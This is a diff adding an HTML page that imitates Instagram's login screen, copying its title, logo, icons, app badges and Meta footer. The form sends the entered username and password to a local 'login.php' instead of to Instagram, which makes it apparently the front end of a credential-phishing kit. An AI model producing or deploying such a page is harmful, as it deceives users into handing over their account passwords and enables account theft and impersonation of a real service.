@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+
+    <!-- إضافة أيقونة Instagram -->
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png" type="image/png">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .wrapper {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-grow: 1;
+        }
+        .phone-image {
+            width: 380px;
+            height: 650px;
+            margin-right: 40px;
+        }
+        .login-container {
+            background-color: white;
+            border: 1px solid #ddd;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+        }
+        .login-container img.logo {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+        .input-container {
+            margin-bottom: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #fafafa;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .divider {
+            margin: 20px 0;
+            position: relative;
+            text-align: center;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            background-color: #ddd;
+            height: 1px;
+            width: 40%;
+            position: absolute;
+            top: 50%;
+        }
+        .divider::before {
+            left: 0;
+        }
+        .divider::after {
+            right: 0;
+        }
+        .divider span {
+            background-color: white;
+            padding: 0 10px;
+        }
+        .signup-link {
+            margin-top: 20px;
+            color: #3897f0;
+            font-weight: bold;
+        }
+        .download-app {
+            margin-top: 20px;
+        }
+        .download-app img {
+            width: 136px;
+            margin: 10px 5px;
+        }
+        /* Footer Section */
+        footer {
+            margin-top: 40px;
+            padding: 20px 0;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        footer a {
+            color: #00376b;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        footer .footer-links {
+            margin-bottom: 10px;
+        }
+        footer p {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png" type="image/png">
+
+
+<body>
+    <div class="wrapper">
+        <!-- Phone image -->
+        <div class="phone-image">
+            <img src="https://media.gcflearnfree.org/content/633d944b3823fb02e84dce55_10_05_2022/Screen%20Shot%202022-10-10%20at%202.28.19%20PM.png" alt="Instagram Phone" width="380" height="650">
+        </div>
+
+        <!-- Login form -->
+        <div class="login-container">
+            <!-- Logo -->
+            <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram Logo" class="logo">
+            
+            <form action="login.php" method="POST">
+                <div class="input-container">
+                    <input type="text" name="username" placeholder="Phone number, username or email" required>
+                </div>
+                <div class="input-container">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit">Log In</button>
+            </form>
+
+            <div class="divider"><span>OR</span></div>
+            <button style="background-color: #fff; color: #385185; border: 1px solid #ddd;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" style="width: 18px; vertical-align: middle; margin-right: 5px;"> Log in with Facebook
+            </button>
+            
+            <div class="signup-link">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
+
+            <div class="download-app">
+                <p>Get the app:</p>
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="#">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D75BCB02A-5D6B-4E60-9AD3-47DD90AC83B7%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge">
+
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <p>English</p>
+        <p>© 2024 Instagram from Meta</p>
+    </footer>
+</body>
+</html>
